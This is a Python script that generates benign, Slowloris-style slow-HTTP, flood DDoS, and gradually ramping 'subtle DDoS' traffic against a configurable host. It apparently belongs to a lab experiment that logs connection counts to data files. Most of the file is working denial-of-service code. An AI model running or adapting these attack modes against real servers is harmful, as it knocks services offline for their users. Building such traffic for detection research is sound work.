import logging
import math
import os
import random
import signal
import socket
import sys
import threading
import time

# Client types
import urllib.request

BENIGN_CLIENT = "0"
SLOW_HTTP_CLIENT = "1"
DDOS_CLIENT = "2"
SUBTLE_DDOS_CLIENT = "3"

CLIENT_TYPE = os.getenv('CLIENT_TYPE', "0")
CLIENT_NAME = os.getenv('CLIENT_NAME', "client{}".format(str(random.randint(1, 100000000))))

DATA_FILE_PATH = "/data/{}.data".format(CLIENT_NAME)

INITIAL_WAIT_TIME = int(os.getenv('WAIT_TIME', 7200))

WAIT_TIME_SECONDS = INITIAL_WAIT_TIME + random.randint(0, 30)
RUN_TIME_SECONDS = 7200


def num_sockets(client_type):
    if client_type == BENIGN_CLIENT or client_type == SUBTLE_DDOS_CLIENT:
        return 1
    return 120


def num_sockets_increase_interval(client_type):
    if client_type == SUBTLE_DDOS_CLIENT:
        return 5
    return math.inf


def sleep_between_request(client_type):
    if client_type == DDOS_CLIENT:
        return 1
    if client_type == SLOW_HTTP_CLIENT:
        return 15
    return 25


def sleep_between_requests_reduce_interval(client_type):
    if client_type == SUBTLE_DDOS_CLIENT:
        return 25
    return math.inf

HOST_IP = os.getenv('HOST_IP', "localhost")
HOST_PORT = os.getenv("HOST_PORT", 80)

HOST = (HOST_IP, HOST_PORT)
NUM_SOCKETS = num_sockets(CLIENT_TYPE)
NUM_SOCKETS_INCREASE_INTERVAL = num_sockets_increase_interval(CLIENT_TYPE)
USER_AGENT = "python_client"
SLEEP_BETWEEN_REQUESTS = sleep_between_request(CLIENT_TYPE)
SLEEP_BETWEEN_REQUESTS_REDUCE_INTERVAL = sleep_between_requests_reduce_interval(CLIENT_TYPE)


def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))


def send_header(self, name, value):
    self.send_line(f"{name}: {value}")


list_of_sockets = []

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

failed_connections = 0
successful_connections = 0


def client():
    logging.info("Created client")
    global successful_connections
    global failed_connections
    global SLEEP_BETWEEN_REQUESTS
    iterations = 1
    while True:
        try:
            url = "http://{}:{}".format(HOST[0], str(HOST[1]))
            with urllib.request.urlopen(url) as response:
                if (response.status == 200):
                    successful_connections += 1
                else:
                    logging.info("Failed connection")
                    failed_connections += 1
        except:
            logging.info("Disconnected")
            failed_connections += 1
        logging.info("Attempted connection")
        time.sleep(SLEEP_BETWEEN_REQUESTS)
        iterations += 1
        if iterations % SLEEP_BETWEEN_REQUESTS_REDUCE_INTERVAL == 0 and SLEEP_BETWEEN_REQUESTS > 1:
            SLEEP_BETWEEN_REQUESTS -= 1


def normal_client():
    global NUM_SOCKETS
    for _ in range(0, NUM_SOCKETS):
        thread = threading.Thread(target=client)
        thread.start()
    created = NUM_SOCKETS
    iterations = 0
    while True:
        time.sleep(2)
        for _ in range(created, NUM_SOCKETS):
            thread = threading.Thread(target=client)
            thread.start()
        created = NUM_SOCKETS
        iterations += 1
        if iterations % NUM_SOCKETS_INCREASE_INTERVAL == 0 and NUM_SOCKETS < 120:
            NUM_SOCKETS += 1


def init_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    s.connect(HOST)

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    s.send_header("User-Agent", USER_AGENT)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s


def slow_http():
    for i in range(0, NUM_SOCKETS):
        try:
            logging.info("Creating socket nr %s", i)
            s = init_socket()
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)

    while True:
        logging.info(
            "Sending keep-alive headers... Socket count: {}".format(len(list_of_sockets))
        )
        for s in list(list_of_sockets):
            try:
                s.send_header("X-a", random.randint(1, 5000))
            except socket.error:
                logging.info("Failed to send header")
                list_of_sockets.remove(s)
        missing_sockets = NUM_SOCKETS - len(list_of_sockets)
        logging.info("Missing sockets: {}".format(missing_sockets))
        for _ in range(0, max(0, missing_sockets)):
            global failed_connections
            failed_connections += 1
            logging.info("Recreating socket...")
            try:
                s = init_socket()
                if s:
                    list_of_sockets.append(s)
            except socket.error as e:
                logging.debug(e)
                break
        logging.debug("Sleeping for %d seconds", SLEEP_BETWEEN_REQUESTS)
        time.sleep(SLEEP_BETWEEN_REQUESTS)


def wait_and_kill():
    time.sleep(RUN_TIME_SECONDS)
    global successful_connections
    global failed_connections
    if CLIENT_TYPE == SLOW_HTTP_CLIENT:
        successful_connections = len(list_of_sockets)
        logging.info("Had: {} successful and {} failed connections".format(successful_connections, failed_connections))
    f = open(DATA_FILE_PATH, "w")
    output = "{}\n{}\n{}".format(CLIENT_TYPE, successful_connections, failed_connections)
    f.write(output)
    f.close()
    os.kill(os.getpid(), signal.SIGINT)


def main():
    logging.basicConfig(format="%(asctime)s: %(message)s", datefmt="%H:%M:%S", level=logging.INFO)
    time.sleep(WAIT_TIME_SECONDS)
    waiting_thread = threading.Thread(target=wait_and_kill)
    waiting_thread.start()
    if CLIENT_TYPE == SLOW_HTTP_CLIENT:
        slow_http()
    else:
        normal_client()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
